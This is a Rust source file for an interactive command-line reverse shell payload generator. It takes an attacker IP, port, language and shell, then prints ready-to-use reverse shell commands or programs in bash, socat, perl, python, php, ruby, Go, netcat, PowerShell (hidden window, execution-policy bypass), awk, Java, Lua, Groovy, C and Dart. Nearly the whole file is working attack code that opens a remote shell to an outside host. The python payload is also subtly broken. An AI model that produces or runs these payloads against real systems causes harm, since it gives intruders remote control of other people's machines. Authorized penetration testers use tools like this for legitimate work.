use ::std::*;
use std::io::Write;

fn main() {
    let banner: &str = "
    █████████                      ███████████
    ███░░░░░███                    ░░███░░░░░███                                  
   ███     ░░░   ██████  ████████   ░███    ░███   ██████  █████ █████            
  ░███          ███░░███░░███░░███  ░██████████   ███░░███░░███ ░░███             
  ░███    █████░███████  ░███ ░███  ░███░░░░░███ ░███████  ░███  ░███             
  ░░███  ░░███ ░███░░░   ░███ ░███  ░███    ░███ ░███░░░   ░░███ ███              
   ░░█████████ ░░██████  ████ █████ █████   █████░░██████   ░░█████               
    ░░░░░░░░░   ░░░░░░  ░░░░ ░░░░░ ░░░░░   ░░░░░  ░░░░░░     ░░░░░                
                                                                                                          
    █████████  █████               ████  ████    CLI Reverse Shell
   ███░░░░░███░░███               ░░███ ░░███    Payload Generator                
  ░███    ░░░  ░███████    ██████  ░███  ░███                                     
  ░░█████████  ░███░░███  ███░░███ ░███  ░███    Written by Amelia <3               
   ░░░░░░░░███ ░███ ░███ ░███████  ░███  ░███                             
   ███    ░███ ░███ ░███ ░███░░░   ░███  ░███    https://m33ls.github.io/                                 
  ░░█████████  ████ █████░░██████  █████ █████   https://github.com/m33ls         
   ░░░░░░░░░  ░░░░ ░░░░░  ░░░░░░  ░░░░░ ░░░░░    
  
  Based on code from https://github.com/swisskyrepo/PayloadsAllTheThings/
                                 Type help for hints and to list options.
   ";
   
    println!("{}", banner);

    let mut ip_help = ["Enter the IP address to connect back to\n  Try `curl ifconfig.me` to check your public IP"];
    let ip = prompt("  Specify host IP: ", &mut ip_help);

    let mut port_help = ["Enter the port to connect back to"];
    let port = prompt("  Specify host port: ", &mut port_help);

    let mut command_help = ["Bash", "Socat", "Perl", "Python", "PHP", "Ruby", "Golang", "Netcat", "PowerShell", "Awk", "Java", "Lua", "Groovy", "C", "Dart"];
    let command = prompt("  Select command: ", &mut command_help);

    let mut shell_help = ["/bin/bash", "/bin/sh", "/bin/zsh", "Custom (enter full path)"];
    let shell = prompt("  Select shell: ", &mut shell_help);

    let mut encoding_help = [""];
    let encoding = prompt("  Select encoding (optional, WIP): ", &mut encoding_help);

    generate_shell(ip, port, command, shell, encoding);

}

fn help(question: &str, options: &mut [&str]) {
    // Display list of options
    // For when 'help' is input

    if options.len() == 1 {
        println!("  {}", options[0]);
    } else {
        for x in 0..options.len() {
            println!("  {x}. {}", options[x]);
        }
    }

    prompt(question, options);
}

fn prompt(question: &str, options: &mut [&str]) -> String {
    // Prompt user to choose option from list

    print!("{question}");
    ::std::io::stdout().flush().unwrap();
    let mut input = String::new();
    io::stdin().read_line(&mut input).expect("Failed to get console input");
    let len = input.trim_end_matches(&['\r', '\n'][..]).len();
    input.truncate(len);

    if input == "help" {
        help(question, options);
    }

    return input
}

fn generate_shell(ip: String, port: String, command: String, shell: String, encoding: String) {
    // Generate the shell using information from the user

    println!("\n  Generating payload . . . \n");

    if command == "bash" {
        println!("\
  bash -i >& /dev/tcp/{ip}/{port} 0>&1
        ");
    } else if command == "socat" {
        println!("\
  LISTENER: socat file:`tty`,raw,echo=0 TCP-L:{port}
  PAYLOAD: /tmp/socat exec:'{shell} -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}
        ");
    } else if command == "perl" {
        println!("\
  perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"{shell} -i\");}};'
        ");
    } else if command == "python" {
        println!("\
  export RHOST=\"{ip}\";export RPORT={port};python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv(\"{ip}\"),int(os.getenv(\"{port}\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{shell}\")'
        ");  
    } else if command == "php" {
        println!("\
  php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"{shell} -i <&3 >&3 2>&3\");'
        ");
    } else if command == "ruby" {
        println!("\
  ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"{shell} -i <&%d >&%d 2>&%d\",f,f,f)'
        ");
    } else if command == "golang" {
        println!("\
  echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"{shell}\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
        ");
    } else if command == "netcat" {
        println!("\
  nc -e {shell} {ip} {port}
        ");
    } else if command == "powershell" {
        println!("\
  powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()
        ");
    } else if command == "awk" {
        println!("\
  awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}' /dev/null
        ");
    } else if command == "java" {
        println!("\
  Thread thread = new Thread(){{
      public void run(){{
        Runtime r = Runtime.getRuntime();
        Process p = r.exec(\"/bin/bash -c 'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'\");
        p.waitFor();
      }}
  }}
  thread.start();
        ");
    } else if command == "lua" {
        println!("\
  LINUX
  lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('{shell} -i <&3 >&3 2>&3');\"
  
  WINDOWS AND LINUX
  lua5.1 -e 'local host, port = \"{ip}\", {port} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'
        ");
    } else if command == "groovy" {
        println!("\
  Thread.start {{
    String host=\"{ip}\";
    int port={port};
    String cmd=\"cmd.exe\";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}}catch (Exception e){{}}}};p.destroy();s.close();
  }}
        ");
    } else if command == "c" {
  println!("\
  #include <stdio.h>
  #include <sys/socket.h>
  #include <sys/types.h>
  #include <stdlib.h>
  #include <unistd.h>
  #include <netinet/in.h>
  #include <arpa/inet.h>
  
  int main(void){{
      int port = {port};
      struct sockaddr_in revsockaddr;
  
      int sockt = socket(AF_INET, SOCK_STREAM, 0);
      revsockaddr.sin_family = AF_INET;       
      revsockaddr.sin_port = htons(port);
      revsockaddr.sin_addr.s_addr = inet_addr(\"{ip}\");
  
      connect(sockt, (struct sockaddr *) &revsockaddr, 
      sizeof(revsockaddr));
      dup2(sockt, 0);
      dup2(sockt, 1);
      dup2(sockt, 2);
  
      char * const argv[] = {{\"{shell}\", NULL}};
      execve(\"{shell}\", argv, NULL);
  
      return 0;       
  }}
        ");
    } else if command == "dart" {
        println!("\
  import 'dart:io';
  import 'dart:convert';

  main() {{
      Socket.connect(\"{ip}\", {port}).then((socket) {{
      socket.listen((data) {{
          Process.start('powershell.exe', []).then((Process process) {{
          process.stdin.writeln(new String.fromCharCodes(data).trim());
          process.stdout
              .transform(utf8.decoder)
              .listen((output) {{ socket.write(output); }});
          }});
      }},
      onDone: () {{
          socket.destroy();
      }});
      }});
  }}
        ");
    } else {
        println!("ERROR: Command not recognized");
    }
}